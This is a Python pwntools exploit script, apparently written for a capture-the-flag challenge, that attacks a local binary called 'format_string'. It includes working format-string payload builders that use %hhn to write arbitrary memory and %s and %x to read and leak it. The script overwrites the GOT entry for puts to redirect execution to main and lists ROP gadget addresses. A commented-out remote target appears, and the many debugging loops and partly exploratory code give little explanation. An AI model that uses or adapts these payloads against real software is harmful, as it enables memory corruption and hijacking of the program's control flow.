#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
from struct import pack, unpack

with open('payload', 'w') as f:
	f.write('')

def send(conn, line):
	conn.sendline(line)
	with open('payload', 'a') as f:
		line += '\x0a'
		f.write(line)

# count = 0
# conn = remote("4.31.182.242", 9002) 
conn = process('./format_string')

welcome = conn.recvuntil('>')
welcome += conn.recvuntil('>')
welcome += conn.recvuntil('>')
print welcome,

current_val = 0

def set_cur_val(a):
	global current_val
	gets_to_zero = 256 - current_val # add this to get to 0x00
	gets_to_destination = gets_to_zero + a # add this to get to where you want to be
	inc = gets_to_destination%256 # adding > 256 is the same as adding 0 so mod 256
	current_val = a
	if inc == 0: # %0c is the same as %1c so if it's 0 difference then just print nothing
		return "" 
	return "%5$0" + str(inc) + "c" 

def payload_write_data_to_addr(data, addr):
	global current_val

	# 0xaabbccdd -> aabbccdd
	hexStr = hex(data)[2:][::-1] # little endian

	# aabbccdd -> [aa, bb, cc, dd]
	byteList = [ hexStr[i:i+2][::-1] for i in xrange(0, len(hexStr), 2) ]

	bytes = [int(x,16) for x in byteList]


	payload = "A" 

	for a in range(len(bytes)):
		payload += p32(addr + a)

	# this is the offset of the first address in our string
	offset = 7 
	current_val = len(payload)

	# current_val is the current number of bytes writen

	# we have our 4 addresses to each byte of the eip
	# write to one of those current_val
	write_to_byte = lambda a: "%{0}$hhn".format(a + offset)

	for pos, byte in enumerate(bytes):
		payload += set_cur_val(byte) + write_to_byte(pos)

	return payload

def payload_read_addr(addr):
	payload = "A" 

	# just writing the address

	payload += p32(addr)

	# this is the offset of the first address in our string
	offset = 7 
	current_val = len(payload)

	payload += ":::%{0}$s:::".format(offset)

	return payload

def deref(addr):

	payload = payload_read_addr(addr)
	send(conn, payload)
	conn.recvuntil(':::'),
	memoryString = conn.recvuntil(':::')[:-3] # 78243533|3633257c|257c7824| .. |:E
	conn.recv(),
	buff = []
	for char in memoryString[::-1]:
		h = hex(ord(char))[2:]
		if len(h) == 1:
			h = '0' + h
		buff.append(h)
	return buff[-4:]


def leak_1(start):
	payload = "%" + str(start) + "$x"
	send(conn, "AA" + payload + "BB")

	conn.recvuntil('AA'),
	memoryString = conn.recvuntil('BB')[:-2] # 78243533|3633257c|257c7824| .. |:E
	conn.recv(),
	# print  payload
	return memoryString
	# return memoryString.split('|')

def map_movement(jump):
	leaks = []
	for x in range(10):
		leaks.append(int(leak_1(jump),16))

	prev = leaks[0]
	for leak in leaks[1:]:
		print prev - leak
		prev = leak

puts = 0x08049aec
fflush = 0x08049ae4
main_start = 0x0804851f
# jump_start = 0x0804850d # 148
jump_start = 0x0804851f # 144
# jump_start = 0x08048520 # 140
# jump_start = 0x08048522 # 140
# jump_start = 0x08048525 # 140
# jump_start = 0x0804850a # 140
after_puts = 0x08048592
main_end = 0x08048592
ret =  0x08048592

dtor = 0x080499e0

ret_rop0 = 0x080489b5# : inc ecx; CUTOUT;; -> ret

esp_rop0 = 0x0804858e# : add esp,0x10; leave; ret
esp_rop1 = 0x0804851b# : lea esp,[ecx-0x4]; ret
esp_rop2 = 0x0804835e# : add esp,0x8; pop ebx; ret

pop_rop0 = 0x080489b2# : push cs; adc al,0x41; ret


# Set puts to be the the main function


payload = payload_write_data_to_addr(jump_start, puts)
send(conn, payload)
print conn.recv(),


send(conn, "payload 5 %x")
print conn.recv(),

# grab an address on the stack
# this is the previous string actualy lol

# for x in range(1, 10):
# 	if x == 0:
# 		continue
# 	print "::" + str(x) + '::'
# 	print leak_1(x)
# map_movement(4)
print leak_1(4)
print leak_1(4)
print leak_1(4)
print leak_1(4)



addr = int(leak_1(5),16)
for x in range(50):
	read_addr = addr + x*4 - 2**6 +1 
	word = deref(read_addr)
	print word,
	print hex(read_addr) + "HI"
	if len(word) == 1 and word[0] == '63':
		print 'YAY'
		for a in range(20):
			payload = payload_write_data_to_addr(0xaabbccdd, read_addr + (a)*144)
			send(conn, payload)
		print conn.recv()
		break

# addr = int(leak_1(20),16)
# for x in range(50):
# 	read_addr = addr + x*4 - 2**6 + 1
# 	word = deref(read_addr)
# 	print word,
# 	print hex(read_addr)


# for x in range(10):
# 	read_addr = addr + x*4 - 44*4 + 1
# 	word = deref(read_addr)
# 	print word,
# 	print hex(read_addr)

# print leak_1(131)
# print leak_1(132)
# print leak_1(133)

# print leak_1(133)
# print leak_1((x*10)*36 + 1)
for x in range(10):
	print leak_1((x*10)*36 + 1),
	print (x*10)*36 + 1

for x in range(10):
	print leak_1((x*10)*36 + 1),
	print (x*10)*36 + 1

# addr = int(leak_1(20),16)
# for x in range(30):
# 	read_addr = addr + x*4 - 44*4 + 1
# 	word = deref(read_addr)
# 	print word,
# 	print hex(read_addr)
# 	if len(word) == 1 and word[0] == '63':
# 		print 'YAY'
# 		for a in range(10):
# 			payload = payload_write_data_to_addr(0xcafebeef, read_addr + a*4)
# 			send(conn, payload)
# 		print conn.recv()
# 		break



# addr = int(leak_1(20),16)
# for x in range(30):
# 	read_addr = addr + x*4 - 44*4 + 1
# 	word = deref(read_addr)
# 	print word,
# 	print hex(read_addr)

# addr = int(leak_1(4),16)
# for x in range(30):
# 	read_addr = addr + x*4 - 44*4 + 1
# 	word = deref(read_addr)
# 	print word,
# 	print hex(read_addr)




# for x in range(2000):
# 	payload = payload_write_data_to_addr(ret, addr + x - 100)
# 	send(conn, payload)
# 	print conn.recv(),


send(conn, "Goodbye :)")
print conn.recv()
# set puts to be the return spot in the main function
payload = payload_write_data_to_addr(main_end, puts)
send(conn, payload)
print conn.recv()

conn.close()


